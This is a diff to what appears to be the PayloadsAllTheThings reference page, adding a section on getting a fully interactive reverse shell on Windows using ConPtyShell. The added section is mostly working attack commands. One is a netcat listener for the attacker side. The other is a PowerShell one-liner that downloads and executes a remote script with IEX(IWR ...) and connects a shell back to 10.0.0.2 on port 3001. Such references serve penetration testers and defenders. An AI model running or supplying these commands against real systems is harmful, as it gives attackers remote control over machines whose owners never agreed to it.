@@ -43,4 +43,24 @@ You might also like the `Methodology and Resources` folder :
 - [CVE Exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits)
 
 
+## Fully interactive reverse shell on Windows
+The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
+
+**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
+
+
+Server Side:
+
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Client Side:
+
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
+
+
 You want more ? Check the [Books](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/BOOKS.md) and [Youtube videos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/YOUTUBE.md) selections.
